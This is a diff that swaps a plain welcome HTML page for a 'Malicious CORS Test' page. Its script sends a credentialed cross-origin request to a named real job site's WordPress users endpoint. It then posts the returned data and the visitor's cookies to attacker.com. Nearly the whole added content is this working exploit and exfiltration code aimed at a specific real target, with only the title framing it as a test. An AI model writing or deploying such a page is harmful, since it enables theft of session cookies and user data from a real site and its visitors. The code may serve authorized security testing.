@@ -1,26 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>My Simple HTML Page</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background-color: #f4f4f4;
-    }
-    h1 {
-      color: #333;
-    }
-    p {
-      color: #555;
-    }
-  </style>
+    <title>Malicious CORS Test</title>
 </head>
 <body>
-  <h1>Welcome to My Simple Page</h1>
-  <p>This is a basic HTML page created as an example.</p>
+    <h1>CORS Test Page</h1>
+    <p>Check console for results or monitor network requests.</p>
+    <script>
+        // Send cross-origin request to jobs.kiwi.com
+        fetch('https://jobs.kiwi.com/wp-json/wp/v2/users', {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json'
+            },
+            credentials: 'include' // Include cookies (e.g., PHPSESSID)
+        })
+        .then(response => {
+            // Check CORS headers
+            const corsHeader = response.headers.get('Access-Control-Allow-Origin');
+            console.log('CORS Allow Origin:', corsHeader);
+            return response.json(); // Parse JSON response
+        })
+        .then(data => {
+            // Log data to console for debugging
+            console.log('Response Data:', data);
+
+            // Exfiltrate data to attacker's server
+            fetch('https://attacker.com/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    source: 'jobs.kiwi.com',
+                    data: data,
+                    cookies: document.cookie
+                })
+            })
+            .then(() => console.log('Data sent to attacker server'))
+            .catch(err => console.error('Exfiltration failed:', err));
+        })
+        .catch(err => console.error('Fetch failed:', err));
+    </script>
 </body>
 </html>
